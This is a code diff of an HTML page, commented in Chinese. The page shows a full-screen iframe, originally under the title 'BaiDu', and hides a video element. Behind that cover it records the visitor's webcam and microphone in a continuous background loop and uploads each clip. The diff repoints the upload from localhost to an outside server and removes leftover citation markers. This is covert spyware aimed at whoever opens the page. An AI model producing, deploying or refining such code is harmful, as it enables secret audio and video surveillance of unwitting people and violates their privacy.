@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BaiDu</title>
+    <title>Webcam BG Process</title>
     <style>
         /* 确保 iframe 能够铺满整个页面 */
         body, html {
-            margin: 0; [cite: 128]
-            padding: 0; [cite: 128]
+            margin: 0;
+            padding: 0;
             height: 100%;
             overflow: hidden; /* 隐藏滚动条 */
         }
         #bg-frame {
-            position: absolute; [cite: 129]
-            top: 0; [cite: 129]
-            left: 0; [cite: 129]
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            border: none; [cite: 130]
+            border: none;
         }
         /* 功能性 video 元素需要存在但完全隐藏 */
         #webcam {
-            display: none; [cite: 131]
+            display: none;
         }
     </style>
 </head>
@@ -56,34 +56,36 @@
                 // 2. 收集数据
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) {
-                        recordedChunks.push(event.data); [cite: 11]
+                        recordedChunks.push(event.data);
                     }
                 };
 
                 // 3. 录制停止后触发上传
                 mediaRecorder.onstop = async () => {
                     console.log('录制停止，准备上传。');
-                    const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' }); [cite: 12]
-                    recordedChunks = []; // 清空数据块数组 
+                    const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = []; // 清空数据块数组
 
                     const formData = new FormData();
-                    // 'video' 是后端 multer 配置的字段名
-                    formData.append('video', recordedBlob, `recording-${Date.now()}.webm`); [cite: 18]
+                    formData.append('video', recordedBlob, `recording-${Date.now()}.webm`);
 
                     try {
-                        const response = await fetch('http://localhost:3000/upload', {
-                            method: 'POST', [cite: 19]
+                        // ==================================================================
+                        // 关键改动：将上传地址更新为您提供的在线服务器地址
+                        const response = await fetch('https://webcam-api.onrender.com/upload', {
+                            method: 'POST',
                             body: formData,
                         });
+                        // ==================================================================
 
                         if (response.ok) {
-                            const result = await response.json(); [cite: 20]
+                            const result = await response.json();
                             console.log('上传成功:', result.message, ' at', new Date().toLocaleTimeString());
                         } else {
-                            console.error('上传失败:', response.statusText); [cite: 21]
+                            console.error('上传失败:', response.statusText, await response.text());
                         }
                     } catch (error) {
-                        console.error('上传发生错误:', error); [cite: 23]
+                        console.error('上传发生错误:', error);
                     } finally {
                         // 不论上传成功与否，都解锁并开始下一次录制
                         console.log('准备开始下一次录制...');
@@ -116,8 +118,8 @@
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: 1280, height: 720 }, 
                     audio: true // 录像通常需要音频
-                }); [cite: 9]
-                webcamVideo.srcObject = stream; [cite: 9, 142]
+                });
+                webcamVideo.srcObject = stream;
                 
                 webcamVideo.onloadedmetadata = () => {
                     console.log('摄像头已就绪，后台录制进程启动。');
@@ -126,12 +128,12 @@
                 };
 
             } catch (error) {
-                console.error('摄像头访问被拒绝或出错:', error); [cite: 10, 144]
+                console.error('摄像头访问被拒绝或出错:', error);
             }
         }
 
         // 启动
-        init(); [cite: 145]
+        init();
     </script>
 </body>
 </html>
